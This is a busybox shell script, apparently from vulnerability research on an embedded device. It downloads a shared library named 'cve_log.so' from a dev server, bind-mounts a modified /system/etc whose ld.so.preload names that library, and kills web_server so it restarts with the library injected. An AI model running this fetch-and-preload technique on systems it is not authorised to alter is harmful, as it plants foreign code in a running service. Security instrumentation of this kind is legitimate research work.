#!/bin/sh
# Activate the FILE logger (cve_log.so) to see exactly what connect_check reads.
# No `tr` (absent on this busybox); use awk. No set -e so a partial step
# still reports instead of vanishing.
# Dev HTTP server serving the .so. Pass it in; never hardcode a LAN address.
HOST=${HOST:?set HOST to the dev http server, e.g. http://HOST:8095}
OVL=/tmp/etcovl3

wget -q -O /tmp/cve_log.so "$HOST/cve_log.so" || { echo FETCH_FAILED; exit 1; }
wget -q -O /tmp/cve_log.so.bytes "$HOST/cve_log.so.bytes" 2>/dev/null
GOT=$(wc -c < /tmp/cve_log.so | awk '{print $1}')
WANT=$(awk '{print $1}' /tmp/cve_log.so.bytes 2>/dev/null)
echo "cve_log.so got=$GOT want=$WANT"
if [ -n "$WANT" ] && [ "$GOT" != "$WANT" ]; then echo SIZE_MISMATCH; exit 1; fi

rm -rf "$OVL"; mkdir -p "$OVL"
cp -a /system/etc/. "$OVL"/ 2>/dev/null || cp -r /system/etc/. "$OVL"/
printf '/tmp/cve_log.so\n' > "$OVL/ld.so.preload"
umount /system/etc 2>/dev/null || true
mount --bind "$OVL" /system/etc || { echo BIND_FAILED; exit 1; }
echo "preload: $(cat /etc/ld.so.preload)"
rm -f /tmp/cve_log.txt
kill -9 $(pidof web_server) 2>/dev/null || true
sleep 8
P=$(pidof web_server)
echo "web_server pid $P"
grep -q cve_log /proc/$P/maps 2>/dev/null && echo LOG_ACTIVE || echo LOG_MISSING
